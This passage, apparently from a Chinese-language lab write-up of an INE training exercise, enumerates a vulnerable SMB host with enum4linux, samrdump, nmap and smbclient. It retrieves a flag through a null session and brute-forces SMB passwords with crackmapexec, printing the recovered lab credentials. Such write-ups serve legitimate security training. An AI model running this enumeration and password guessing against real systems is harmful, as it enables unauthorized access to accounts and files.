S-1-5-21-1554144052-2760123283-2295077451-1009 EVILCORP-SMB-SHARES\Reserved (Local Group)
S-1-5-21-1554144052-2760123283-2295077451-1010 EVILCORP-SMB-SHARES\Tester (Domain Group)
S-1-5-21-1554144052-2760123283-2295077451-1011 EVILCORP-SMB-SHARES\Admin (Domain Group)
S-1-5-21-1554144052-2760123283-2295077451-1012 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1013 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1014 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1015 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1016 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1017 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1018 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1019 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1020 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1021 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1022 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1023 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1024 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1025 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1026 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1027 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1028 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1029 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1030 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1031 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1032 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1033 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1034 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1035 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1036 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1037 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1038 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1039 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1040 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1041 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1042 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1043 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1044 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1045 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1046 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1047 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1048 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1049 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1050 *unknown*\*unknown* (8)

 =============================================== 
|    Getting printer info for demo.ine.local    |
 =============================================== 
No printers returned.


enum4linux complete on Wed Jul 20 15:27:38 2022
```

获得如下可用信息：

```
用户：
ecorp
william
raymond
michael
elliot
admin

共享：
        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)

密码策略：
[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

组：
[+] Getting local groups:
group:[Reserved] rid:[0x3f1]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Developer] rid:[0x3ee]
group:[Guest] rid:[0x3ef]
group:[Maintainer] rid:[0x3f0]
group:[Tester] rid:[0x3f2]
group:[Admin] rid:[0x3f3]

[+] Getting domain group memberships:
Group 'Developer' (RID: 1006) has member: EVILCORP-SMB-SHARES\admin
Group 'Developer' (RID: 1006) has member: EVILCORP-SMB-SHARES\elliot
Group 'Guest' (RID: 1007) has member: EVILCORP-SMB-SHARES\admin
Group 'Guest' (RID: 1007) has member: EVILCORP-SMB-SHARES\raymond
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\admin
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\michael
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\elliot
Group 'Tester' (RID: 1010) has member: EVILCORP-SMB-SHARES\admin
Group 'Tester' (RID: 1010) has member: EVILCORP-SMB-SHARES\william
```

### samrdump.py
```
root@INE:/usr/share/doc/python3-impacket/examples# ls
addcomputer.py     GetADUsers.py       GetUserSPNs.py  mssqlclient.py        ping.py           rpcdump.py      smbexec.py    ticketConverter.py
atexec.py          getArch.py          goldenPac.py    mssqlinstance.py      psexec.py         rpcmap.py       smbpasswd.py  ticketer.py
dcomexec.py        Get-GPPPassword.py  karmaSMB.py     netview.py            raiseChild.py     sambaPipe.py    smbrelayx.py  wmiexec.py
dpapi.py           GetNPUsers.py       kintercept.py   nmapAnswerMachine.py  rbcd.py           samrdump.py     smbserver.py  wmipersist.py
esentutl.py        getPac.py           lookupsid.py    ntfs-read.py          rdp_check.py      secretsdump.py  sniffer.py    wmiquery.py
exchanger.py       getST.py            mimikatz.py     ntlmrelayx.py         registry-read.py  services.py     sniff.py
findDelegation.py  getTGT.py           mqtt_check.py   ping6.py              reg.py            smbclient.py    split.py
root@INE:/usr/share/doc/python3-impacket/examples# python3 samrdump.py
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

usage: samrdump.py [-h] [-csv] [-ts] [-debug] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [-hashes LMHASH:NTHASH]
                   [-no-pass] [-k] [-aesKey hex key]
                   target

This script downloads the list of users for the target system.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  -csv                  Turn CSV output
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is
                        the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid
                        credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
```

由于我们没有用户名或密码，我们将简单地提供受害者机器的 IP 地址。 samrdump 为我们提供了来自 SAM 帐户的一些信息，例如用户名和 uid。

```
root@INE:/usr/share/doc/python3-impacket/examples# python3 samrdump.py demo.ine.local
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from demo.ine.local
Found domain(s):
 . EVILCORP-SMB-SHARES
 . Builtin
[*] Looking up users in domain EVILCORP-SMB-SHARES
Found user: ecorp, uid = 1000
Found user: william, uid = 1002
Found user: raymond, uid = 1004
Found user: michael, uid = 1001
Found user: elliot, uid = 1003
Found user: admin, uid = 1005
ecorp (1000)/FullName: 
ecorp (1000)/UserComment: 
ecorp (1000)/PrimaryGroupId: 513
ecorp (1000)/BadPasswordCount: 0
ecorp (1000)/LogonCount: 0
ecorp (1000)/PasswordLastSet: 2021-11-16 20:35:41
ecorp (1000)/PasswordDoesNotExpire: False
ecorp (1000)/AccountIsDisabled: False
ecorp (1000)/ScriptPath: 
william (1002)/FullName: 
william (1002)/UserComment: 
william (1002)/PrimaryGroupId: 513
william (1002)/BadPasswordCount: 0
william (1002)/LogonCount: 0
william (1002)/PasswordLastSet: 2021-11-16 20:35:42
william (1002)/PasswordDoesNotExpire: False
william (1002)/AccountIsDisabled: False
william (1002)/ScriptPath: 
raymond (1004)/FullName: 
raymond (1004)/UserComment: 
raymond (1004)/PrimaryGroupId: 513
raymond (1004)/BadPasswordCount: 0
raymond (1004)/LogonCount: 0
raymond (1004)/PasswordLastSet: 2021-11-16 20:35:42
raymond (1004)/PasswordDoesNotExpire: False
raymond (1004)/AccountIsDisabled: False
raymond (1004)/ScriptPath: 
michael (1001)/FullName: 
michael (1001)/UserComment: 
michael (1001)/PrimaryGroupId: 513
michael (1001)/BadPasswordCount: 0
michael (1001)/LogonCount: 0
michael (1001)/PasswordLastSet: 2021-11-16 20:35:41
michael (1001)/PasswordDoesNotExpire: False
michael (1001)/AccountIsDisabled: False
michael (1001)/ScriptPath: 
elliot (1003)/FullName: 
elliot (1003)/UserComment: 
elliot (1003)/PrimaryGroupId: 513
elliot (1003)/BadPasswordCount: 0
elliot (1003)/LogonCount: 0
elliot (1003)/PasswordLastSet: 2021-11-16 20:35:42
elliot (1003)/PasswordDoesNotExpire: False
elliot (1003)/AccountIsDisabled: False
elliot (1003)/ScriptPath: 
admin (1005)/FullName: 
admin (1005)/UserComment: 
admin (1005)/PrimaryGroupId: 513
admin (1005)/BadPasswordCount: 0
admin (1005)/LogonCount: 0
admin (1005)/PasswordLastSet: 2021-11-16 20:35:42
admin (1005)/PasswordDoesNotExpire: False
admin (1005)/AccountIsDisabled: False
admin (1005)/ScriptPath: 
[*] Received 6 entries.
```

通过了解密码复杂性和用户 ID，我们可以使用暴力破解工具进一步利用这些信息。 所以我们将有更好的机会利用远程系统。

### nmap
我们可以匿名访问 `IPC$` 共享，换句话说，系统容易受到空会话的攻击。

但此处没有测试成功。

[smb-enum-shares](https://nmap.org/nsedoc/scripts/smb-enum-shares.html)

```
root@INE:~# nmap --script smb-enum-shares.nse -p445 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 17:12 IST
Nmap scan report for demo.ine.local (192.44.238.3)
Host is up (0.000069s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:2C:EE:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
root@INE:~# nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 17:13 IST
Nmap scan report for demo.ine.local (192.44.238.3)
Host is up (0.000059s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
137/udp open  netbios-ns
MAC Address: 02:42:C0:2C:EE:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

[smb-enum-users](https://nmap.org/nsedoc/scripts/smb-enum-users.html)

```
root@INE:~# nmap --script smb-enum-users.nse -p 445 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 17:34 IST
Nmap scan report for demo.ine.local (192.155.107.3)
Host is up (0.000072s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:9B:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
root@INE:~# nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 17:35 IST
Nmap scan report for demo.ine.local (192.155.107.3)
Host is up (0.000083s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
137/udp open  netbios-ns
MAC Address: 02:42:C0:9B:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

[smb-brute](https://nmap.org/nsedoc/scripts/smb-brute.html)

```
root@INE:~# nmap --script smb-brute.nse -p445 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 17:49 IST
Nmap scan report for demo.ine.local (192.155.107.3)
Host is up (0.000054s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:9B:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
root@INE:~# nmap -sU -sS --script smb-brute.nse -p U:137,T:139 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 17:49 IST
Nmap scan report for demo.ine.local (192.155.107.3)
Host is up (0.000072s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
137/udp open  netbios-ns
MAC Address: 02:42:C0:9B:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

参考：[Nmap 枚举共享不起作用](https://stackoverflow.com/questions/42256744/nmap-enum-shares-not-working)

根据debug信息，**代码仅在服务器支持 SMB1 时才有效**。

```
root@INE:~# nmap --script smb-enum-shares.nse -p445 demo.ine.local -d
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 10:03 IST
--------------- Timing report ---------------
  hostgroups: min 1, max 100000
  rtt-timeouts: init 1000, min 100, max 10000
  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
  parallelism: min 0, max 0
  max-retries: 10, host-timeout: 0
  min-rate: 0, max-rate: 0
---------------------------------------------
NSE: Using Lua 5.3.
NSE: Arguments from CLI: 
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Initiating ARP Ping Scan at 10:03
Scanning demo.ine.local (192.129.98.3) [1 port]
Packet capture filter (device eth1): arp and arp[18:4] = 0x0242C081 and arp[22:2] = 0x6202
Completed ARP Ping Scan at 10:03, 0.06s elapsed (1 total hosts)
Overall sending rates: 16.98 packets / s, 713.34 bytes / s.
mass_rdns: Using DNS server 127.0.0.11
Initiating SYN Stealth Scan at 10:03
Scanning demo.ine.local (192.129.98.3) [1 port]
Packet capture filter (device eth1): dst host 192.129.98.2 and (icmp or icmp6 or ((tcp) and (src host 192.129.98.3)))
Discovered open port 445/tcp on 192.129.98.3
Completed SYN Stealth Scan at 10:03, 0.04s elapsed (1 total ports)
Overall sending rates: 24.19 packets / s, 1064.52 bytes / s.
NSE: Script scanning 192.129.98.3.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 10:03
NSE: Starting smb-enum-shares against demo.ine.local (192.129.98.3).
NSE: [smb-enum-shares 192.129.98.3] SMB: Attempting to log into the system to enumerate shares
NSE: [smb-enum-shares 192.129.98.3] SMB: Added account '' to account list
NSE: [smb-enum-shares 192.129.98.3] SMB: Added account 'guest' to account list
NSE: [smb-enum-shares 192.129.98.3] Couldn't negotiate a SMBv1 connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
NSE: [smb-enum-shares 192.129.98.3] SMB: Enumerating shares failed, guessing at common ones (Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9])
NSE: [smb-enum-shares 192.129.98.3] Couldn't negotiate a SMBv1 connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
NSE: [smb-enum-shares 192.129.98.3] Couldn't negotiate a SMBv1 connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
NSE: Finished smb-enum-shares against demo.ine.local (192.129.98.3).
Completed NSE at 10:03, 0.01s elapsed
Nmap scan report for demo.ine.local (192.129.98.3)
Host is up, received arp-response (0.000042s latency).
Scanned at 2022-07-21 10:03:09 IST for 0s

PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:C0:81:62:03 (Unknown)

Host script results:
| smb-enum-shares: 
|_  ERROR: Couldn't enumerate shares: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
Final times for host: srtt: 42 rttvar: 3762  to: 100000

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Read from /usr/bin/../share/nmap: nmap-mac-prefixes nmap-payloads nmap-services.
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
```

参考：[Nmap V 7.80 #1707上的回归 smb_enum_users 和共享](https://github.com/nmap/nmap/issues/1707)

使用“smb-protocols”脚本检查是否支持 SMB1。
如果没有，并且假设您想枚举用户，那么不幸的是，您现在应该使用不同的工具。

`Crackmapexec`、`SharpHound`、`mimikatz` 等许多允许通过 SMB 远程枚举本地用户。

“smb-protocols”脚本应该没有任何问题。你使用正确吗？例如：

```
nmap -p445 -v --script smb-protocols <ip>
```

```
root@INE:~# nmap -p445 -v --script smb-protocols demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 10:01 IST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:01
Completed NSE at 10:01, 0.00s elapsed
Initiating ARP Ping Scan at 10:01
Scanning demo.ine.local (192.129.98.3) [1 port]
Completed ARP Ping Scan at 10:01, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:01
Scanning demo.ine.local (192.129.98.3) [1 port]
Discovered open port 445/tcp on 192.129.98.3
Completed SYN Stealth Scan at 10:01, 0.05s elapsed (1 total ports)
NSE: Script scanning 192.129.98.3.
Initiating NSE at 10:01
Completed NSE at 10:01, 0.02s elapsed
Nmap scan report for demo.ine.local (192.129.98.3)
Host is up (0.000042s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:81:62:03 (Unknown)

Host script results:
| smb-protocols: 
|   dialects: 
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1

NSE: Script Post-scanning.
Initiating NSE at 10:01
Completed NSE at 10:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
```

所以“smb-protocols”可以正常工作，并显示 SMB1 不受支持，因此许多不支持 SMB2+ 的 Nmap 脚本将无法工作。

尝试使用`mimikatz` 通过 SMB 远程枚举本地用户。

### 使用Smbclient列出共享和传输文件
现在我们已经使用Enum4linux收集了有关目标的一些信息，我们可以使用其中一种底层工具与系统上的SMB进行实际交互。

Smbclient是用于访问服务器上的SMB资源的工具。

```
root@INE:~# smbclient --help
Usage: smbclient service <password>
  -R, --name-resolve=NAME-RESOLVE-ORDER     Use these name resolution services only
  -M, --message=HOST                        Send message
  -I, --ip-address=IP                       Use this IP to connect to
  -E, --stderr                              Write messages to stderr instead of stdout
  -L, --list=HOST                           Get a list of shares available on a host
  -m, --max-protocol=LEVEL                  Set the max protocol level
  -T, --tar=<c|x>IXFvgbNan                  Command line tar
  -D, --directory=DIR                       Start from directory
  -c, --command=STRING                      Execute semicolon separated commands
  -b, --send-buffer=BYTES                   Changes the transmit/send buffer
  -t, --timeout=SECONDS                     Changes the per-operation timeout
  -p, --port=PORT                           Port to connect to
  -g, --grepable                            Produce grepable output
  -q, --quiet                               Suppress help message
  -B, --browse                              Browse SMB servers using DNS

Help options:
  -?, --help                                Show this help message
      --usage                               Display brief usage message

Common samba options:
  -d, --debuglevel=DEBUGLEVEL               Set debug level
  -s, --configfile=CONFIGFILE               Use alternate configuration file
  -l, --log-basename=LOGFILEBASE            Base name for log files
  -V, --version                             Print version
      --option=name=value                   Set smb.conf option from command line

Connection options:
  -O, --socket-options=SOCKETOPTIONS        socket options to use
  -n, --netbiosname=NETBIOSNAME             Primary netbios name
  -W, --workgroup=WORKGROUP                 Set the workgroup name
  -i, --scope=SCOPE                         Use this Netbios scope

Authentication options:
  -U, --user=USERNAME                       Set the network username
  -N, --no-pass                             Don't ask for a password
  -k, --kerberos                            Use kerberos (active directory) authentication
  -A, --authentication-file=FILE            Get the credentials from a file
  -S, --signing=on|off|required             Set the client signing state
  -P, --machine-pass                        Use stored machine account password
  -e, --encrypt                             Encrypt SMB transport
  -C, --use-ccache                          Use the winbind ccache for authentication
      --pw-nt-hash                          The supplied password is the NT hash
```

```
root@INE:~# smbclient --help
用法：smbclient 服务 <密码>
  -R, --name-resolve=NAME-RESOLVE-ORDER 仅使用这些名称解析服务
  -M, --message=HOST 发送消息
  -I, --ip-address=IP 使用这个IP连接到
  -E, --stderr 将消息写入标准错误而不是标准输出
  -L, --list=HOST 获取主机上可用的共享列表
  -m, --max-protocol=LEVEL 设置最大协议级别
  -T, --tar=<c|x>IXFvgbNan 命令行 tar
  -D, --directory=DIR 从目录开始
  -c, --command=STRING 执行分号分隔的命令
  -b, --send-buffer=BYTES 更改发送/发送缓冲区
  -t, --timeout=SECONDS 更改每个操作的超时时间
  -p, --port=PORT 要连接的端口
  -g, --grepable 产生 grepable 输出
  -q, --quiet 禁止显示帮助信息
  -B, --browse 使用 DNS 浏览 SMB 服务器

帮助选项：
  -?, --help 显示此帮助信息
      --usage 显示简要使用信息

常见的桑巴舞选项：
  -d, --debuglevel=DEBUGLEVEL 设置调试级别
  -s, --configfile=CONFIGFILE 使用备用配置文件
  -l, --log-basename=LOGFILEBASE 日志文件的基本名称
  -V, --version 打印版本
      --option=name=value 从命令行设置 smb.conf 选项

连接选项：
  -O, --socket-options=SOCKETOPTIONS 要使用的套接字选项
  -n, --netbiosname=NETBIOSNAME 主 netbios 名称
  -W, --workgroup=WORKGROUP 设置工作组名称
  -i, --scope=SCOPE 使用这个 Netbios 范围

身份验证选项：
  -U, --user=USERNAME 设置网络用户名
  -N, --no-pass 不要求输入密码
  -k, --kerberos 使用 kerberos（活动目录）身份验证
  -A, --authentication-file=FILE 从文件中获取凭据
  -S, --signing=on|off|required 设置客户端签名状态
  -P, --machine-pass 使用存储的机器账户密码
  -e, --encrypt 加密 SMB 传输
  -C, --use-ccache 使用 winbind ccache 进行认证
      --pw-nt-hash 提供的密码是 NT 哈希
```

在Linux上使用smbclient检查空会话：

```
root@INE:~# smbclient //192.70.149.3/IPC$ -N
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> exit
root@INE:~# smbclient //192.70.149.3/c$ -N
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
```

`-L`：获取目标上的共享列表。

```
root@INE:~# smbclient -L //192.70.149.3/
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

连接到 SMB 时，我们需要在地址周围使用斜杠。现在，它会提示我们输入 root 的密码，但如果配置不正确，我们可以通过在提示符处按Enter来匿名登录。

我们之前看到允许空会话，这意味着我们也可以使用空白的用户名和密码登录。使用`-U`标志指定用户名（在本例中为空白字符串），使用`-N`标志指定无密码：

```
root@INE:~# smbclient -L //192.70.149.3/ -U '' -N

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

我们现在已经列出了共享而没有提供任何凭据，现在我们可以通过指定主机 IP 地址和共享名称来连接到共享。

```
root@INE:~# smbclient //192.70.149.3/public
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 21:35:49 2022
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  test                                D        0  Tue Nov 16 20:35:43 2021
  dev                                 D        0  Tue Nov 16 20:35:43 2021
  prod                                D        0  Tue Nov 16 20:35:43 2021
  .hidden                            DH        0  Tue Nov 16 20:35:43 2021
  flag_1                              A        0  Wed Jul 20 21:35:49 2022

                1981094964 blocks of size 1024. 135471324 blocks available
smb: \> cd .hidden
smb: \.hidden\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Wed Jul 20 21:35:49 2022
  flag_1                              N       33  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135471244 blocks available
smb: \.hidden\> get flag_1
getting file \.hidden\flag_1 of size 33 as flag_1 (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
```

```
root@INE:~# cat flag_1
HgQQZGOH0twJLImZ1uWMHvRxETuw8kIC
```

创建users.txt文件：

```
ecorp
william
raymond
michael
elliot
admin
```

该命令虽然没有报错，但是也没有爆破出有效内容。因为该脚本只支持SMBv1，而服务器只支持SMBv2和SMBv3。

```
nmap -sU -sS --script smb-brute.nse -p U:137,T:139 --script-args userdb='/root/users.txt',passdb='/root/Desktop/wordlists/100-common-passwords.txt' demo.ine.local
```

### CrackMapExec
参考：[Using crendentials with CrackMapExec](https://wiki.porchetta.industries/getting-started/using-credentials)

```
root@INE:~# crackmapexec smb demo.ine.local
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [*] Windows 6.1 Build 0 (name:EVILCORP-SMB-SHARES) (domain:ine.local) (signing:False) (SMBv1:False)
```

```
root@INE:~# crackmapexec smb demo.ine.local -u william -p /root/Desktop/wordlists/100-common-passwords.txt
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [*] Windows 6.1 Build 0 (name:EVILCORP-SMB-SHARES) (domain:ine.local) (signing:False) (SMBv1:False)
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\william:242424 STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\william:0987654321 STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\william:marisol STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\william:nikita STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [+] ine.local\william:cookie1
```

得到用户名密码：`william:cookie1`。

```
root@INE:~# crackmapexec smb demo.ine.local -u elliot -p /root/Desktop/wordlists/100-common-passwords.txt
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [*] Windows 6.1 Build 0 (name:EVILCORP-SMB-SHARES) (domain:ine.local) (signing:False) (SMBv1:False)
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\elliot:242424 STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\elliot:0987654321 STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\elliot:marisol STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [+] ine.local\elliot:xbox360
```

得到用户名密码：`elliot:xbox360`。

```
root@INE:~# crackmapexec smb demo.ine.local -u admin -p /root/Desktop/wordlists/100-common-passwords.txt
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [*] Windows 6.1 Build 0 (name:EVILCORP-SMB-SHARES) (domain:ine.local) (signing:False) (SMBv1:False)
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\admin:242424 STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\admin:0987654321 STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [-] ine.local\admin:marisol STATUS_LOGON_FAILURE 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [+] ine.local\admin:adminpasswd
```

得到用户名密码：`admin:adminpasswd`。

我们获得了如下有效凭据：

```
william:cookie1
elliot:xbox360
admin:adminpasswd
```

再次尝试使用smbclient连接共享。

```
smbclient //192.253.162.3/william -U william --password cookie1
```

```
root@INE:~# smbclient //192.253.162.3/william -U william --password cookie1
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  calendar                            D        0  Tue Nov 16 20:35:43 2021
  meetings                            D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135618028 blocks available
smb: \> cd calendar\
smb: \calendar\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135618020 blocks available
smb: \calendar\> cd ..
smb: \> cd meetings\
smb: \meetings\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
